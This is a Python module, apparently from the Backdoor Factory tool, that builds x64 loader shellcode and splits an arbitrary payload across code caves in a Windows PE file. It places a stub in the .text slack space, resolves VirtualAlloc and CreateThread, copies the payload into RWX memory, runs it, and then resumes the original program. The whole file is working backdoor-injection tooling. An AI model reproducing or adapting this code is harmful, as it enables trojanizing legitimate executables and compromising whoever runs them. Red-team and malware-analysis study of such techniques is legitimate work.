import os
import logging
from core import enum
from pe.core import core
from pe.core import eat_code_caves
import struct
from common import common
import secrets
import math
logger = logging.getLogger(__name__)


class cfg_loader_payload_splitting:

    def __init__(self, BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """cfg_loader_payload_splitting"""
        self.description = """Places a stub in the text section, finds one code cave, and loads payloads in memory"""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')
        self.requirements = {
                            }
        self.BDF = BDF
        self.supported_methods = ['hook_cfg',]
        self.distance_from_payload = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        self.loader_resume_exe_offset = {}
        self.second_distance_from_payload_offset = {}
        # Default is two
        self.number_of_caves = 2

    def invoke_mode(self):

        return self.main()

    def main(self):
        # overwrite these
        if 'NUMBER_OF_CAVES' in self.BDF.options:
            self.number_of_caves = int(self.BDF.options['NUMBER_OF_CAVES'])

        if self.BDF.TESTING:
            self.flag = b"\x41\x41\x41\x41"
        else:
            self.flag = secrets.token_bytes(4)

        logger.debug(f'Payload flag: {self.flag}')

        self.shellcode = self.flag + self.BDF.pe_object['shellcode']
        self.shellcode_len = len(self.shellcode) + len(self.BDF.pe_object['resumeExe'])

        self.equal_cave_length = math.ceil(self.shellcode_len/self.number_of_caves)

        self.BDF.pe_object['len_allshells'] = ()

        for cave_number in range(0, self.number_of_caves):
            self.BDF.pe_object['len_allshells'] += (self.equal_cave_length),

        # 1. Get the loader payload from the payload, the payload blob, and the resumeExe from the core
        # LOADER WORKFLOW SINGLE CAVE
        # comeback and investigate this nop, if not there cfg not-encoded breaks
        self.loader = b"\x90\x50"                    # push rax
        self.loader += b"\x51"                   # push rcx
        self.loader += b"\x9c"                   # pushf
        self.loader_distance_offset = len(self.loader)

        # get location
        self.loader += b"\xE8\x00\x00\x00\x00"   # call +5
        self.loader += b"\x58"                   # pop rax
        self.loader += b"\x48\xb9"               # mov value below to rcx
        # address this diff
        self.loader_distance_from_payload_offset = len(self.loader)

        self.loader += self.distance_from_payload

        self.loader += b"\x48\x01\xC8"           # add rax, rcx
        self.loader += b"\x50"                   # push addr on stack
        self.loader += b"\x8B\x00"               # mov eax, DWORD ptr [rax]
        self.loader += b"\x85\xC0"               # test eax, eax
        self.loader += b"\x58"                   # pop the address back in rax
        self.loader += b"\x75\x05"               # jne 0X flip flag
        # don't load
        self.loader += b"\x9D"                   # popf
        self.loader += b"\x59"                   # pop rcx
        self.loader += b"\x58"                   # pop rax
        self.loader += b"\xff\xe0"               # jmp rax

        # flip flag
        self.loader += b"\xC7\x00\x00\x00\x00\x00"  # mov DWORD ptr [rax], 0
        # load payload
        self.loader += b"\x9D"                   # popf
        self.loader += b"\x59"                   # pop rcx
        self.loader += b"\x58"                   # pop rax
        # TODO: you could just popf and push the rest, then push the flags
        self.loader += self.stackpreserve

        self.loader += b"\xfc"                   # CLD
        self.loader += b"\x55\x48\x89\xE5"       # mov rbp, rsp
        self.loader += b"\x48\x31\xD2"           # xor rdx, rdx
        self.loader += b"\x65\x48\x8B\x52\x60"   # mov rdx, QWORD ptr gs: [rdx+0x60]
        self.loader += b"\x48\x8B\x52\x10"       # mov rdx, Qword ptr [rdx + 10]

        # rdx now module entry
        self.loader += b"\x49\xBE"                                       # mov value below to r14

        if self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['ImageBase']) < 0:
            self.loader += struct.pack("<Q", 0xffffffff + (self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['ImageBase']) + 1))
        else:
            self.loader += struct.pack("<Q", self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['ImageBase']))
        # RDX holds entry point
        self.loader += b"\x49\x01\xD6"                                   # add r14 + RDX
        self.loader += b"\x49\xBF"                                       # mov value below to r15
        if self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['ImageBase']) < 0:
            self.loader += struct.pack("<Q", 0xffffffff + (self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['ImageBase']) + 1))
        else:
            self.loader += struct.pack("<Q", self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['ImageBase']))
        self.loader += b"\x49\x01\xD7"                                   # add r15 + RDX

        # r14 virtualalloc
        # r15 createthread

        self.loader += (b"\x5d"                                          # pop rbp
                        b"\x49\xc7\xc5"                                  # mov r13, size of payload...
                            )

        self.loader += struct.pack("<I", self.shellcode_len)
        self.loader += bytes("\x6a\x40"                                      # push 40h
                            "\x41\x59"                                      # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"                          # push 1000h
                            "\x41\x58"                                      # pop r8.. now 1000h
                            "\x4C\x89\xEA"                                  # mov rdx, r13
                            "\x6A\x00"                                      # push 0
                            "\x59"                                          # pop rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x16"                                  # call qword ptr [r14]
                            "\x48\x89\xc3"                                  # mov rbx, rax      ; Store allocated address in rbx
                            , 'iso-8859-1')
        self.loader += b"\x48\x89\xc7"                                      # mov rdi, rax      ; Prepare RDI with the new address

        for i in range(0, self.number_of_caves):
            self.loader += b"\x48\xc7\xc1"                                      # mov rcx, value below

            self.loader_resume_exe_offset[i] = len(self.loader)

            self.loader += struct.pack("<I", len(self.BDF.pe_object['payload_stub']) + self.BDF.pe_object['resumeExe_len'])

            #self.loader_distance_offset = len(self.loader)

            self.loader += b"\xE8\x00\x00\x00\x00"  # call +5
            self.loader += b"\x5E"                  # pop rsi
            self.loader += b"\x48\xB8"              # mov rax, value below

            #self.loader_distance_from_payload_offset = len(self.loader)
            # address this diff
            self.second_distance_from_payload_offset[i] = len(self.loader)
            if self.distance_from_payload == b"\x00\x00\x00\x00\x00\x00\x00\x00":

                self.loader += self.distance_from_payload
            else:
                self.loader += struct.pack("<Q", struct.unpack("<Q", self.distance_from_payload)[0] - len(self.loader) + 0x10)
            self.loader += b"\x48\x01\xC6"          # add rsi, rax

            self.loader += b"\xf2\xa4"                                   # rep movsb          ; Copy the payload to RWX memory

        self.loader += b"\xff\xe3"                                   # jmp rbx
        # END LOADER

        self.BDF.pe_object['loader_stub'] = self.loader

        if 'loader_stub' not in self.BDF.pe_object:
            logger.error('Loader_stub object missing, wrong payload for METHOD and/or MODE?')
            self.BDF.pe_object['loader_stub'] = b'\x00'
            return False

        logger.info(f"Loader len: {hex(len(self.BDF.pe_object['loader_stub']))}, {len(self.BDF.pe_object['loader_stub'])}")
        logger.info(f"payload_stub len: {hex(len(self.BDF.pe_object['payload_stub']))}, {len(self.BDF.pe_object['payload_stub'])}")

        # 2. see if the loader + the resumeEXE will fit in the text section
        logger.info(f"ResumeEXE stub len: {len(self.BDF.pe_object['resumeExe'])}")

        self.BDF.pe_object['txt_slck_spc'] = self.BDF.pe_object['textSizeRawData'] - \
            self.BDF.pe_object['textVirtualSize']

        logger.info(f"slack_space_size: hex: {hex(self.BDF.pe_object['txt_slck_spc'])}, {self.BDF.pe_object['txt_slck_spc']}")

        self.BDF.pe_object['txt_vrt_slck_loc'] = self.BDF.pe_object['textVirtualAddress'] + \
            self.BDF.pe_object['ImageBase'] + \
            self.BDF.pe_object['textVirtualSize']
        logger.info(f"txt_vrt_slck_loc: {self.BDF.pe_object['txt_vrt_slck_loc']}, hex: {hex(self.BDF.pe_object['txt_vrt_slck_loc'])}")

        if self.BDF.pe_object['txt_slck_spc'] >= len(self.BDF.pe_object['loader_stub']):
            logger.info(f"Text slack space is large enough")
        else:
            logger.error(f"Text slack space is too small, the dev will need to write a process expand the text section and update all the headers")
            return False

        # assign where the entrypoint hook should go:
        self.BDF.pe_object['text_loader_location'] = self.BDF.pe_object['textPointerToRawData'] + \
            self.BDF.pe_object['textVirtualSize']

        # overwrite JMPtoCodeAddress with the text_loader location
        logger.debug(f"text_loader_location: {hex(self.BDF.pe_object['text_loader_location'])}")
        self.BDF.pe_object['JMPtoCodeAddress'] = self.BDF.pe_object['text_loader_location'] - \
            self.BDF.pe_object['LocOfEntryinCode'] - 5
        logger.debug(f"JMPtoCodeAddress in text_loader: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

        # PatchLocation is where the jmp off point from either entry or the loader.

        self.BDF.pe_object['PatchLocation'] = (self.BDF.pe_object['text_loader_location']  +
                                               self.loader_distance_offset +
                                               (self.BDF.pe_object['textVirtualAddress'] -
                                               self.BDF.pe_object['textPointerToRawData'])
                                               )

        # override change access for caves not needed
        #Because the loader sets the flag to zero, the section must be writable. 
        # Typically the .data section is writeable. Others are not.
        self.BDF.options['CHANGE_ACCESS'] = False

        if not self.find_cave():
            return False

        loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.loader_distance_from_payload_offset]
        loader_tmp_back = self.BDF.pe_object['loader_stub'][self.loader_distance_from_payload_offset + len(self.distance_from_payload):]


        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['CavesPicked'][0][6]) + loader_tmp_back

        for i in range(0, self.number_of_caves):
            # Overwrite the resumeExe len
            loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.loader_resume_exe_offset[i]]
            loader_tmp_back = self.BDF.pe_object['loader_stub'][self.loader_resume_exe_offset[i] + 4:]

            if i == 0:
                # For the last iteration

                self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<I", self.equal_cave_length - len(self.flag)) + loader_tmp_back
            else:

                self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<I", self.equal_cave_length) + loader_tmp_back
            # Overwrite 2nd distance to payload offset

            loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.second_distance_from_payload_offset[i]]
            loader_tmp_back = self.BDF.pe_object['loader_stub'][self.second_distance_from_payload_offset[i] + len(self.distance_from_payload):]

            if i != 0:
                self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['CavesPicked'][i][6] -
                                                                                    self.second_distance_from_payload_offset[i] +
                                                                                    0x10 - len(self.flag)) + loader_tmp_back
            else:
                self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['CavesPicked'][i][6] - self.second_distance_from_payload_offset[i] + 0x10) + loader_tmp_back

        self.completeShellcode = self.shellcode + self.BDF.pe_object['resumeExe']

        return True

    def find_cave(self):
        self.BDF.pe_object['cave_jumping'] = True
        # return the full length of the payload

        self.BDF.SIZE_CAVE_TO_FIND = sorted(self.BDF.pe_object['len_allshells'])[0]

        modifier = core.core(self.BDF)
        if hasattr(modifier, self.BDF.options['MODIFIER'].lower()):
            logger.debug(f"Modifier: {self.BDF.options['MODIFIER']}")
            self.BDF.found_modifier = getattr(modifier, self.BDF.options['MODIFIER'].lower())
        else:
            logger.error('No found modifier')
            return False

        # for this method text_loader, it is not going to write to the section to stop re-execution
        # of the payload. Therefore, it does not need a RW section only.

        # The CFG, off entry method, does need RW section to modify a flag once execution is set.
        if self.BDF.found_modifier(sectionFlags=0xc0000040, CaveNumber=0) is not True:
            return False

        logger.debug(f"Caves Picked {self.BDF.pe_object['CavesPicked']}")

        return True

    def get_patch_instr(self):

        logger.debug(f"loader_stub: {self.BDF.pe_object['loader_stub']}")

        # Put text full_)oader in text section
        self.BDF.patch_instr[self.BDF.pe_object['text_loader_location']] = self.BDF.pe_object['loader_stub']

        # Update virtual size to textSizeRawData size
        self.BDF.patch_instr[self.BDF.pe_object['.text\x00\x00\x00_VirtualSize_LOC']] = struct.pack('<I', self.BDF.pe_object['textSizeRawData'])

        self.BDF.pe_object['allshells'] = ()

        for i in range(0, self.number_of_caves):
            self.BDF.pe_object['allshells'] += (self.completeShellcode[i*self.equal_cave_length:(i+1)*self.equal_cave_length], )

        for i, item in self.BDF.pe_object['CavesPicked'].items():
            logger.debug(f"[->] Location: {hex(int(self.BDF.pe_object['CavesPicked'][i][1], 16))}, {self.BDF.pe_object['allshells'][i]}")

            self.BDF.patch_instr[int(self.BDF.pe_object['CavesPicked'][i][1], 16)] = self.BDF.pe_object['allshells'][i]

        return True
